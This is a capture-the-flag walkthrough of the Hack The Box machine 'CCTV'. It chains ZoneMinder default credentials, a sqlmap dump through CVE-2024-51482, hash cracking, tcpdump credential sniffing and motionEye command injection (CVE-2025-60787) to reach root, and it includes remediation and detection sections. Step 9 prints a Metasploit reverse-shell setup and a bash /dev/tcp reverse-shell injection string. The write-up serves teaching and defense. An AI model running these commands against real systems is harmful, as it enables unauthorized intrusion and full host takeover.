Hack The Box / Easy / Linux

CCTV

Full compromise of an Easy Linux target themed around open-source CCTV software. A ZoneMinder deployment left default credentials in place, and an authenticated boolean-based blind SQL injection (CVE-2024-51482) dumped the application's bcrypt password hashes, one of which cracked offline to an SSH password. A tcpdump binary carrying the cap_net_raw capability allowed passive capture of plaintext credentials crossing an unencrypted Docker bridge, moving access to a second user. An internal motionEye instance, reachable only through an SSH local-forward, was then compromised through an authenticated OS command injection in a filename configuration field (CVE-2025-60787) that was guarded only by client-side JavaScript — yielding a root shell.

Retired machine · validated walkthrough · Authorized laboratory assessment · Reviewed: 2026-10-02

Dylan Senez / D4RKGUNN3R

CVE-2024-51482 blind SQL injection, default credentials, bcrypt hash cracking, cleartext Docker-bridge traffic, cap_net_raw abuse, CVE-2025-60787 command injection, client-side validation bypass

Case overview

Outcome

The user and root flags were captured. Root was obtained through CVE-2025-60787 without any kernel exploit; the decisive gap was that motionEye wrote a user-controlled filename straight into Motion's configuration file, where a separate process later interpreted it as shell syntax.

Key takeaway

No single "critical" bug was required. Five ordinary weaknesses — default credentials, a blind SQL injection, unencrypted inter-container traffic, a dangerous Linux capability, and client-side-only input validation — chained into complete host compromise. The final step is the most instructive: a validation check that existed only in the browser had been treated as a security boundary.

Validated steps were directly reproduced. Documented steps are supported by preserved artifacts. Staged steps remain incomplete or await evidence.

Attack path

  • nmap -p- 10.129.244.156 → 22 (OpenSSH 9.6p1) and 80 (Apache httpd 2.4.58) — Ubuntu 24.04 fingerprint, no other externally exposed ports
  • ZoneMinder on port 80 → default credentials admin:admin left in place
  • CVE-2024-51482 boolean-based blind SQL injection (tid parameter) → dump zm.Users → bcrypt hashes for superadmin, mark, admin
  • hashcat -m 3200 (rockyou.txt) → mark's hash cracks to an SSH password (<REDACTED>) → SSH foothold as mark
  • Enumerate capabilities and listening sockets: /usr/bin/tcpdump carries cap_net_raw; motionEye on 127.0.0.1:8765 and Motion webcontrol on 127.0.0.1:7999
  • tcpdump on the Docker bridge → plaintext credential for sa_mark recovered from an unencrypted TCP stream
  • su - sa_mark → user flag in /home/sa_mark
  • /etc/motioneye/motion.conf leaks the motionEye admin password hash; ssh -L 8765:localhost:8765 exposes the loopback-bound UI locally
  • CVE-2025-60787 → override client-side JavaScript validation → command injection in the still-image filename field → Motion restart → root shell
  • cat /root/root.txt

1. Reconnaissance — Port and service discovery

Validated · Kali / Attacker · EVD-001

Artifact

scans/cctv.nmap

Objective

Identify exposed TCP services on 10.129.244.156 and collect service banners for fingerprinting.

Command / request

nmap -p- --reason --min-rate 10000 10.129.244.156
nmap -sCV -p 22,80 10.129.244.156

Observed result

22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Redirecting...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Analysis

The full-port sweep exposes only two services: SSH and HTTP. Nothing management-related is externally reachable, which will matter later when motionEye is found bound to loopback. OpenSSH 9.6p1 together with Apache 2.4.58 is consistent with Ubuntu 24.04 LTS, but banner versions are fingerprinting observations, not proof of a vulnerability.

Why this mattered

Established the exposed surface — a single web application plus SSH — and the absence of a public management port framed the local-only discovery that followed.

2. Reconnaissance — ZoneMinder accessed with default credentials

Validated · Kali / Browser · EVD-002

Artifact

cctv.htb (vhost)

Objective

Enumerate the web application and attempt known default credentials before hunting for a CVE.

Command / request

# Add the redirect target to /etc/hosts, then browse:
#   10.129.244.156  cctv.htb
http://cctv.htb/zm/
# Login: admin / admin

Observed result

ZoneMinder console opened with full administrative menus. A subdomain brute-force (ffuf -H "Host: FUZZ.cctv.htb") returned no additional virtual hosts.

Analysis

The HTTP service redirected to the vhost cctv.htb. The default credential pair admin/admin was accepted with no prior exploitation, which is an authentication weakness rather than a CVE. This authenticated context is exactly what the vulnerable ZoneMinder action requires. The result is an observation of accepted default credentials; it does not imply the account is the only or highest-privileged one.

Why this mattered

Provided the authenticated session needed to reach the vulnerable action and demonstrated why testing defaults belongs at the top of web enumeration.

3. Initial Access — CVE-2024-51482 — boolean-based blind SQL injection and user dump

Validated · Kali / sqlmap · EVD-003

Artifact

req.txt + zm_dump.txt

Objective

Assess the tid parameter of the authenticated removetag action for SQL injection and extract the application's user table.

Command / request

# Capture an authenticated request (ZMSESSID cookie) to the removetag action into req.txt:
#   GET /zm/index.php?view=request&request=event&action=removetag&tid=1

sqlmap -r req.txt -p tid --batch --dbms=mysql --technique=B \
    --prefix="1 UNION SELECT 1,2,3,4 WHERE " --code 200 --dbs

sqlmap -r req.txt -p tid --batch --dbms=mysql \
    -D zm -T Users -C Username,Password,Name,Email --dump

Observed result

Database: zm
Table: Users
+----+------------+----------------------------------+-------+-------+
| Id | Username   | Password                         | Name  | Email |
+----+------------+----------------------------------+-------+-------+
| 1  | superadmin | $2y$10$<REDACTED bcrypt>         |       |       |
| 2  | mark       | $2y$10$<REDACTED bcrypt>         | mark  |       |
| 3  | admin      | $2y$10$<REDACTED bcrypt>         | admin |       |
+----+------------+----------------------------------+-------+-------+

Analysis

The tid parameter is injectable in the authenticated removetag action (CVE-2024-51482). Supplying the known boolean oracle to sqlmap (--prefix, --code 200, --technique=B) reduced a potentially hour-long blind dump to a targeted extraction of four columns. The dump yields bcrypt hashes; at this point it does not prove that any hash is crackable or that any of these credentials are reused on the host.

Why this mattered

Converted an authenticated web session into the credential material required for a host foothold, and showed the value of feeding a tool the oracle you already possess.

4. Initial Access — Offline bcrypt cracking and SSH foothold as mark

Validated · Kali / hashcat · EVD-004

Artifact

zm.hashes + rockyou.txt

Objective

Recover a plaintext password from the dumped hashes and test it against the exposed SSH service.

Command / request

hashcat zm.hashes rockyou.txt --user -m 3200

sshpass -p '<CRACKED_PASSWORD>' ssh mark@cctv.htb

Observed result

$2y$10$<REDACTED bcrypt>:<CRACKED_PASSWORD>

mark@cctv:~$

Analysis

One bcrypt hash (mark) cracked offline against rockyou.txt; the admin hash simply resolved to the same default password already known. The recovered password was accepted for SSH as mark, which links a database credential to a system account. The plaintext password is redacted from this report.

Why this mattered

Established an interactive, low-privileged system foothold — the pivot point for the host enumeration that uncovered the lateral and escalation paths.

5. Enumeration — Linux capabilities and loopback-only services

Validated · Target — mark SSH session · EVD-005

Artifact

getcap / netstat output

Objective

Enumerate SUID binaries, Linux capabilities, and locally-bound listening sockets for lateral-movement and escalation opportunities.

Command / request

getcap -r / 2>/dev/null
find / -type f -perm -4000 2>/dev/null
netstat -tnlp

Observed result

/usr/bin/tcpdump cap_net_raw=eip

(SUID: stock Ubuntu binaries only)

tcp  0  0 127.0.0.1:8765  0.0.0.0:*  LISTEN   (motionEye)
tcp  0  0 127.0.0.1:7999  0.0.0.0:*  LISTEN   (Motion webcontrol)

Analysis

Two facts stand out. First, /usr/bin/tcpdump carries cap_net_raw=eip, which is not a default Ubuntu configuration and lets an unprivileged user capture raw packets on any interface — including Docker bridges where inter-container traffic may flow in cleartext. Second, motionEye (8765) and Motion's control interface (7999) listen only on localhost and are therefore invisible to the earlier external scan. SUID enumeration returned stock binaries only.

Why this mattered

Identified both a passive data-collection primitive (cap_net_raw) and the internal services that the remaining escalation targets depend on.

6. Lateral Movement — Sniffing plaintext credentials off the Docker bridge

Validated · Target — mark SSH session · EVD-006

Artifact

capture.pcap

Objective

Use the cap_net_raw-granted capture tool to identify and read unprotected host/container management traffic.

Command / request

timeout 120 tcpdump -i any -w ~/capture.pcap
# Analyse offline in Wireshark:
#   Statistics → Conversations → TCP → Follow → TCP Stream (ASCII)

Observed result

A host-to-container TCP stream carried a username and password in cleartext. Credential values redacted.

Analysis

Management traffic on the Docker bridge was unencrypted. Filtering by conversations rather than protocol hierarchy isolated the relevant stream quickly, and following it as ASCII recovered a plaintext credential pair for the second account, sa_mark. This is a traffic-exposure weakness that is independent of the initial SQL injection and required no cracking.

Why this mattered

Moved access from mark to the account that owns the user flag, purely through passive observation — no kernel exploit and no further cracking.

7. User Access — Lateral movement to sa_mark and user flag capture

Validated · Target — mark → sa_mark · EVD-007

Artifact

/home/sa_mark/user.txt

Objective

Validate the sniffed credential by switching user, then capture the user flag.

Command / request

su - sa_mark
cat /home/sa_mark/user.txt

Observed result

sa_mark@cctv:~$ cat /home/sa_mark/user.txt
user flag <REDACTED>

Analysis

The sniffed credential was valid, confirming the Docker-bridge exposure as an actual attack path rather than a theoretical one. The user flag resides in sa_mark's home directory; the value is redacted from this report.

Why this mattered

Confirmed user-level compromise of the second account and demonstrated the concrete impact of cleartext inter-container traffic.

8. Privilege Escalation — motionEye config leak and SSH local-forward

Validated · Target — sa_mark/mark session, localhost:8765 · EVD-008

Artifact

/etc/motioneye/motion.conf

Objective

Recover the motionEye administrative secret and expose the loopback-bound management interface to the attacker.

Command / request

cat /etc/motioneye/motion.conf

ssh -L 8765:127.0.0.1:8765 mark@cctv.htb -N
# If password auth is skipped by a key attempt:
#   ssh -o PubkeyAuthentication=no -o PasswordAuthentication=yes \
#       -L 8765:127.0.0.1:8765 mark@cctv.htb -N

Observed result

webcontrol_port 7999
webcontrol_localhost on
@admin_username admin
@admin_password <REDACTED SHA-1 hash>

# Local browser now reaches http://127.0.0.1:8765 — motionEye 0.43.1b4

Analysis

The readable motion.conf documents the loopback-only webcontrol port and exposes the motionEye admin password material as a SHA-1 hash. An SSH local-forward bridges the loopback-bound UI to the attacker, which is why a service that never appeared in the external scan is suddenly reachable. motionEye reports version 0.43.1b4, within the affected range for CVE-2025-60787. The hash is treated here as authentication material, not as a recovered plaintext password.

Why this mattered

Brought the vulnerable, localhost-only management interface within reach and supplied the administrative authentication material needed to exercise it.

9. Privilege Escalation — CVE-2025-60787 — authenticated command injection in motionEye

Validated · Kali / Metasploit, forwarded 127.0.0.1:8765 · EVD-009

Artifact

/tmp/cctv_exploit.rc

Objective

Exploit the authenticated command injection in motionEye to obtain code execution as the Motion daemon user.

Command / request

use exploit/linux/http/motioneye_auth_rce_cve_2025_60787
set payload cmd/linux/http/x64/shell_reverse_tcp
set RHOSTS 127.0.0.1
set RPORT 8765
set PASSWORD <REDACTED admin secret>
set LHOST <TUN0_IP>
set LPORT 4444
set --clear encoder
run

# Manual equivalent (browser DevTools console), then set the still-image filename:
#   configUiValid = function () { return true; };
#   image_file_name = $(bash -c 'bash -i >& /dev/tcp/<TUN0_IP>/4444 0>&1')

Observed result

[*] Command shell session 1 opened (<TUN0_IP>:4444)
id
uid=0(root) gid=0(root) groups=0(root)

Analysis

motionEye writes the still-image filename field into /etc/motioneye/camera-*.conf without sanitization; when the Motion service next restarts, it interprets the value as shell-expandable syntax and executes the injected command as the Motion daemon user — root here. The only barrier in the web UI is a JavaScript regex and validator function, which an authenticated attacker replaces in the browser console. Clearing the encoder selects a plain shell_reverse_tcp payload because the HTTP payload's default encoding step failed for the meterpreter variants; that is a Metasploit tooling detail, not a property of the vulnerability. This exploit is authenticated by design (CVE-2025-60787 is PR:H), so it consumes the admin material recovered in the previous step rather than bypassing authentication.

Why this mattered

Root was achieved purely through an authenticated application-layer command injection. No kernel exploit was used, which makes the host's patch level irrelevant to the outcome.

10. Privilege Escalation — Root shell and root flag capture

Validated · Target — root · EVD-010

Artifact

/root/root.txt

Objective

Confirm root context and capture the terminal objective.

Command / request

id
cat /root/root.txt

Observed result

uid=0(root) gid=0(root) groups=0(root)
root flag <REDACTED>

Analysis

Root context was confirmed and the root flag read. Terminal objective met.

Why this mattered

Demonstrates end-to-end impact: default credentials → SQL injection → cracked credential → cleartext Docker traffic → loopback-only management interface → authenticated command injection → root.

Findings & remediation

F-1 — Default administrative credentials left in place on ZoneMinder

Medium · Validated · cctv.htb — ZoneMinder web console (port 80)

Description

The internet-facing ZoneMinder deployment accepted the vendor default credential pair admin/admin. No password change or account lockout stood between an anonymous visitor and a fully privileged management console.

Impact

Immediate authenticated access to the application, which granted the context required to reach the vulnerable removetag action and to exploit CVE-2024-51482. It removed any need to obtain a first credential.

Root cause

Default credentials shipped with the application were never changed, and no policy or technical control forced rotation before the service was exposed.

Remediation

  • Change or disable all vendor default accounts before exposing the service
  • Enforce a strong password policy and require rotation on first login
  • Add multi-factor authentication for administrative consoles and restrict management interfaces to trusted networks
  • Monitor application and system logs for successful logins using known default credential pairs

Validation

  • admin/admin accepted at http://cctv.htb/zm/ with no prior exploitation (EVD-002)

F-2 — Authenticated boolean-based blind SQL injection in ZoneMinder (CVE-2024-51482)

High · Validated · cctv.htb — ZoneMinder, tid parameter of the removetag action

Description

The tid parameter in the authenticated removetag request could be manipulated with a boolean-based blind SQL injection, allowing an authenticated attacker to enumerate and dump arbitrary data from the backend database — including the bcrypt password hashes for every account in the zm.Users table.

Impact

Disclosure of all application credentials in crackable form. One hash cracked to a password that was reused for a system account, converting web access into an SSH foothold on the host.

Root cause

User-controlled input (tid) was concatenated into a SQL query without parameterization or type enforcement, so the database interpreted injected predicates as part of the query.

Remediation

  • Use parameterized queries / prepared statements for every database access and enforce integer types on identifiers such as tid
  • Upgrade ZoneMinder to a version that fixes CVE-2024-51482
  • Apply least privilege to the database account and deploy WAF rules for this parameter
  • Rotate all application credentials and invalidate sessions after the fix

Validation

  • sqlmap dumped zm.Users (Username, Password, Name, Email) using a boolean oracle (EVD-003)

F-3 — Cleartext credentials on an unencrypted Docker bridge

High · Validated · cctv.htb — host/container management traffic on the Docker bridge

Description

Administrative traffic between a container and the host crossed the Docker bridge unencrypted and contained a username and password in plaintext. A low-privileged host user able to capture packets recovered the credential for a second account.

Impact

Lateral movement from the mark foothold to the sa_mark account and access to the user flag. The exposure is passive — no exploitation and no cracking were required once packets could be captured.

Root cause

Management and authentication protocols were carried over an unencrypted channel, so credential material was readable to anyone who could observe the bridge.

Remediation

  • Encrypt all inter-container and host-to-container management channels (TLS or an authenticated, encrypted tunnel) and disable plaintext admin protocols
  • Never send credentials over unencrypted channels; prefer token- or certificate-based authentication
  • Segment container networks and restrict which workloads may communicate across the bridge
  • Rotate any credentials that were ever transmitted in cleartext

Validation

  • tcpdump capture on the Docker bridge followed in Wireshark yielded a plaintext username/password pair (EVD-006); the credential was accepted via su - sa_mark (EVD-007)

F-4 — cap_net_raw capability granted to tcpdump

Medium · Validated · cctv.htb — /usr/bin/tcpdump (cap_net_raw=eip)

Description

The packet-capture binary was granted the cap_net_raw capability, allowing any local user to capture raw packets on every interface without root. This capability is not a default Ubuntu setting and effectively turned an unprivileged foothold into a network-observation platform.

Impact

Enabled the interception of cleartext credentials on the Docker bridge (F-3), which in turn enabled lateral movement to a second account. It converted a low-impact host foothold into a credential-theft primitive.

Root cause

A powerful Linux capability was granted to a general-purpose binary without need or oversight, so the capability's privilege was available to every local user.

Remediation

  • Remove cap_net_raw from tcpdump (setcap -r /usr/bin/tcpdump) unless a documented, audited need exists
  • Audit capabilities regularly (getcap -r / 2>/dev/null) and alert on cap_net_raw / cap_net_admin on general-purpose binaries
  • Restrict who may run packet-capture tooling and scope captures to approved interfaces and windows
  • Prefer encrypted management channels so that capture alone yields no usable secret

Validation

  • getcap identified cap_net_raw=eip on /usr/bin/tcpdump; a non-root capture succeeded (EVD-005, EVD-006)

F-5 — Authenticated OS command injection in motionEye with client-side-only validation (CVE-2025-60787)

High · Validated · cctv.htb — motionEye 0.43.1b4 on 127.0.0.1:8765

Description

motionEye 0.43.1b4 wrote the still-image filename configuration value into /etc/motioneye/camera-*.conf without sanitization. The value is interpreted as shell-expandable syntax when the Motion service restarts, so an authenticated administrator could inject shell commands (for example, using $() or backticks) that execute as the Motion daemon user — root on this host. The web UI's only guard was a JavaScript regex and validator function, which an attacker replaces in the browser console.

Impact

Complete host compromise and capture of the root flag. The vulnerability is authenticated (CVSS PR:H), so the admin material recovered from motion.conf was a prerequisite; however, the security-relevant validation existed solely in the browser, so the server never independently rejected the malicious value.

Root cause

Configuration values are written to a file that a separate process later evaluates as shell syntax, with no server-side input validation or escaping; the only check was a client-side JavaScript function that an authenticated attacker fully controls.

Remediation

  • Upgrade motionEye beyond 0.43.1b4 (fixed in 0.43.1b5 and later)
  • Sanitize and allowlist filename configuration fields server-side; never pass user input to a shell and escape any value written into a Motion config file
  • Re-implement the filename validation on the server — client-side checks are not a security boundary
  • Run motionEye/Motion as a dedicated unprivileged user and keep the loopback-only webcontrol port closed except on an explicit, authenticated management path
  • Treat any write of shell metacharacters into camera-*.conf as a high-severity detection

Validation

  • Authenticated exploitation via exploit/linux/http/motioneye_auth_rce_cve_2025_60787 against the forwarded 127.0.0.1:8765 returned a shell; id returned uid=0(root) (EVD-009, EVD-010)

Analysis

None of the five weaknesses on CCTV was individually extraordinary, and that is the point. The chain only completed because each control was treated as someone else’s responsibility: the vendor left default credentials in place, the application validated the tid parameter in the browser rather than on the server, and the platform granted a packet-capture binary a capability that turned a support tool into a privilege-escalation primitive. The most important lesson is the last hop — motionEye’s command injection was guarded by client-side JavaScript only, so the browser was mistaken for a security boundary. Remove any single link and the path to root collapses; the defensive priority is therefore the cheapest, earliest control (credential hygiene and patch level), not the most visually dramatic bug.

Remediation

  • Remove or disable every vendor default account (ZoneMinder admin/admin) before exposing the console, and force a credential rotation on first login.
  • Patch ZoneMinder to a release that fixes CVE-2024-51482, and validate the tid parameter server-side rather than trusting the client.
  • Encrypt inter-container and management traffic so credentials are never carried in cleartext across the Docker bridge.
  • Strip cap_net_raw from tcpdump and audit the whole host for stray capabilities with getcap -r / 2>/dev/null.
  • Upgrade motionEye to 0.43.1b5 or later and enforce filename validation on the server, independent of any browser-side check.
  • Restrict ZoneMinder and motionEye management interfaces to trusted networks; loopback-only bindings are not defence in depth on a host you do not fully control.

Defender perspective

Every stage of this chain was ordinary, and none of it required a kernel exploit. The compromise began with credentials that were never changed, continued through a web vulnerability that leaked crackable hashes, then through management traffic left readable on the wire, and ended with a configuration value that one process wrote and another executed. The highest-value controls sit at the boundaries: default-credential elimination and MFA on internet-facing applications, parameterized database access instead of string-built queries, encryption of all inter-container and host-to-container management channels, minimization of Linux capabilities granted to general-purpose binaries, and — perhaps most importantly — enforcing input constraints on the server rather than trusting a browser to do it. A defender who patches kernel CVEs but leaves loopback-bound management panels unauthenticated and unvalidated has hardened the wrong layer.

Detection opportunities

  • Alert on successful authentication with default or vendor-shipped credentials (admin/admin) against internet-facing applications
  • Detect blind SQL injection by correlating repeated identically-structured requests from one session with anomalous response timing or size drift, and deploy WAF rules for the ZoneMinder tid parameter
  • Encrypt all container and host-to-container management channels and monitor for plaintext credential material on Docker bridges
  • Audit Linux capabilities (getcap -r /) and alert on cap_net_raw or cap_net_admin granted to packet-capture or general-purpose binaries such as tcpdump
  • Alert on any packet capture (tcpdump, tshark) running outside an approved context, and on su/sudo transitions immediately following a capture
  • Treat writes to /etc/motioneye/camera-*.conf that contain shell metacharacters ($(), backticks, ;, |) as high severity, and alert on Motion service restarts following config changes
  • Baseline the motionEye/Motion configuration files and alert on modification, especially of filename fields

Lessons learned

  • Test default credentials first — the simplest path frequently wins, and ZoneMinder shipped admin/admin on a production-facing host
  • Guide sqlmap with the oracle you already understand (prefix, response code, technique) instead of accepting its default detection strategy — it turned a blind dump into a targeted extraction
  • Linux capabilities are privilege-escalation primitives: cap_net_raw on tcpdump is not a default setting and hands a non-root user raw packet capture on every interface
  • Inter-container traffic is not implicitly trustworthy — the Docker bridge carried credentials in cleartext
  • Localhost-only does not mean safe — an SSH local-forward is a two-second bridge to any loopback-bound management interface
  • Client-side validation is a convenience, not a control; the server must enforce input constraints independently of the browser
  • Configuration values written to disk and later interpreted by another process are a classic command-injection sink

Open questions

  • Was the ZoneMinder default password left in place deliberately as the intended entry point, or did it simply shortcut the SQL-injection step?
  • Which component actually emits the plaintext sa_mark credential, and why was that channel left unencrypted instead of tunnelled?
  • Was the motionEye admin password ever recoverable in plaintext, or is the hash-as-credential behaviour the only practical path?
  • Does CVE-2025-60787 affect only the still-image filename field, or also adjacent fields such as movie_filename?
  • The machine accepts at least two unintended paths (unauthenticated Motion control on port 7999, and the hash-as-password quirk); would hardening either one alone have closed the intended chain?

Troubleshooting & success factors

  • Confirm the VPN tunnel is actually up and note your assigned address with ip addr show tun0 before trusting any scan result; a stalled tunnel returns empty or misleading output.
  • When SSH refuses password authentication, retry explicitly with ssh -o PubkeyAuthentication=no <user>@<host> to force the password path the machine expects.
  • The internal motionEye instance only answers on loopback; keep the SSH local-forward (ssh -L <local>:127.0.0.1:<remote>) open and browse 127.0.0.1, not the machine IP.
  • Crack the dumped bcrypt hashes offline (hashcat -m 3200) instead of hammering the login page, which is slower and risks lockout.
  • Treat a blank or identical HTTP response as unproven, not as "safe": re-run the boolean-based SQLi with a payload pair that guarantees a true/false difference before trusting the result.
  • Keep a rough timeline of active exploitation (about 20 minutes end to end here) so the writeup reflects real effort and not the much longer research time.
